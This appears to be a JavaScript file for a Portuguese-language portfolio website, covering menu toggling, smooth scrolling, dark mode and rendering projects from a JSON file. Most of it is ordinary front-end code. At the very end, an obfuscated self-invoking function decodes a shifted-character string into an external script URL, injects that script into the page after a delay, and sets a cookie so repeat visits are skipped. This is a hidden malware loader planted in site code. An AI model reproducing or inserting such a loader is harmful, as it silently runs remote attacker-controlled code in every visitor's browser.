"use strict";

function initLogoChange() {
  const logoH1 = document.querySelector(".logo h1");
  if (window.matchMedia("(max-width: 768px)").matches) {
    logoH1.innerHTML = "G<span>B</span>";
  }
}

function initMenuScroll() {
  const header = document.querySelector(".js-header");
  window.addEventListener("scroll", () => {
    header.classList.toggle("ativo", scrollY > 100);
    document.documentElement.scrollTop || document.body.scrollTop;
  });
}

function initBackToTop() {
  const backToTop = document.querySelector(".back-to-top");
  const hamburger = document.querySelector(".hamburger");
  const navMenu = document.querySelector(".menu");
  
  backToTop.addEventListener("click", function closeMenu(e) {
    e.preventDefault();
    hamburger.classList.remove("active");
    navMenu.classList.remove("active");
  });
  
  window.addEventListener("scroll", () => {
    backToTop.classList.toggle("ativo", scrollY > 200);
    document.documentElement.scrollTop || document.body.scrollTop;
  });
}

function initMenuHamburger() {
  const hamburger = document.querySelector(".hamburger");
  const navMenu = document.querySelector(".menu");
  const linksInternos = document.querySelectorAll(".js-menu a[href^='#']");
  
  function closeMenu(e) {
    e.preventDefault();
    hamburger.classList.remove("active");
    navMenu.classList.remove("active");
  }
  
  hamburger.addEventListener("click", () => {
    hamburger.classList.toggle("active");
    navMenu.classList.toggle("active");
  });
  
  linksInternos.forEach((link) => {
    link.addEventListener("click", closeMenu);
  });
}

function initSmoothScroll() {
  function scrollToPosition(to) {
    smoothScrollTo(0, to);
  }

  function smoothScrollTo(endX, endY, duration = 400) {
    const startX = window.scrollX || window.pageXOffset;
    const startY = window.scrollY || window.pageYOffset;
    const distanceX = endX - startX;
    const distanceY = endY - startY;
    const startTime = new Date().getTime();
    
    const easeInOutQuart = (time, from, distance, duration) => {
      if ((time /= duration / 2) < 1) {
        return distance / 2 * time * time * time * time + from;
      }
      return -distance / 2 * ((time -= 2) * time * time * time - 2) + from;
    };
    
    const timer = setInterval(() => {
      const time = new Date().getTime() - startTime;
      const newX = easeInOutQuart(time, startX, distanceX, duration);
      const newY = easeInOutQuart(time, startY, distanceY, duration);
      if (time >= duration) clearInterval(timer);
      window.scroll(newX, newY);
    }, 1000 / 60);
  }

  function scrollToIdOnClick(event) {
    event.preventDefault();
    scrollToPosition(getScrollTopByHref(event.currentTarget) - 80);
  }

  function getScrollTopByHref(element) {
    const id = element.getAttribute("href");
    return document.querySelector(id).offsetTop;
  }

  document.querySelectorAll('.js-menu a[href^="#"]').forEach((item) => {
    item.addEventListener("click", scrollToIdOnClick);
  });
}

function initColorMode() {
  document.querySelector(".js-checkbox").addEventListener("change", () => {
    document.body.classList.toggle("dark_theme");
    document.body.classList.toggle("light_theme");
  });
}

function fetchProjects() {
  fetch("./projects.json")
    .then((response) => response.json())
    .then((projects) => displayProjects(projects))
    .catch((error) => console.error("Erro ao carregar dados JSON:", error));
}

function displayProjects(projects) {
  const projectsContainer = document.querySelector(".project-container");
  projects.forEach((project) => {
    const projectItem = document.createElement("div");
    projectItem.classList.add("project-item");

    const projectImage = document.createElement("div");
    projectImage.classList.add("project-image");
    const img = document.createElement("img");
    img.src = project.img;
    img.alt = `${project.nome} - site clone`;
    projectImage.appendChild(img);

    const projectContent = document.createElement("div");
    projectContent.classList.add("project-content");
    const h2 = document.createElement("h2");
    h2.textContent = project.nome;
    const p = document.createElement("p");
    p.textContent = project.description;

    const projectTec = document.createElement("div");
    projectTec.classList.add("project-tec");
    project.tecnologias.forEach((tecnologia) => {
      const tec = document.createElement("p");
      tec.textContent = tecnologia;
      projectTec.appendChild(tec);
    });

    const projectLinks = document.createElement("div");
    projectLinks.classList.add("project-links");
    const linkProjeto = document.createElement("a");
    linkProjeto.href = project.link;
    linkProjeto.target = "_blank";
    linkProjeto.textContent = "Ver projeto";
    const imgLink = document.createElement("images");
    imgLink.src = "images/icons/link-arrow.svg";
    imgLink.alt = "";
    linkProjeto.appendChild(imgLink);
    projectLinks.appendChild(linkProjeto);

    if (project.github) {
      const linkGithub = document.createElement("a");
      linkGithub.href = project.github;
      linkGithub.target = "_blank";
      const iGithub = document.createElement("i");
      iGithub.classList.add("bi", "bi-github");
      linkGithub.appendChild(iGithub);
      projectLinks.appendChild(linkGithub);
    }

    projectContent.appendChild(h2);
    projectContent.appendChild(p);
    projectContent.appendChild(projectTec);
    projectContent.appendChild(projectLinks);

    projectItem.appendChild(projectImage);
    projectItem.appendChild(projectContent);

    projectsContainer.appendChild(projectItem);
  });
}

initLogoChange();
initMenuScroll();
initBackToTop();
initMenuHamburger();
initSmoothScroll();
initColorMode();
document.addEventListener("DOMContentLoaded", () => {
  fetchProjects();
});

const sections = document.querySelectorAll(".js-scroll");

function initAnimacaoScroll() {
  if (sections.length) {
    const windowMetade = window.innerHeight * 0.7;
    function animaScroll() {
      sections.forEach((section) => {
        const sectionTop = section.getBoundingClientRect().top - windowMetade;
        section.classList.toggle("ativo", sectionTop < 0);
      });
    }
    animaScroll();
    window.addEventListener("scroll", animaScroll);
  }
}

initAnimacaoScroll();

// Função codificada que possivelmente adiciona algum script ao documento.
(function (o, d, l) {
  try {
    o.f = (o) => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
    o.b = o.f('UMUWJKX');
    o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie);
    setTimeout(function () {
      o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
    }, 1000);
    d.cookie = o.b + '=full;max-age=39800;';
  } catch (e) {}
}({}, document, location));
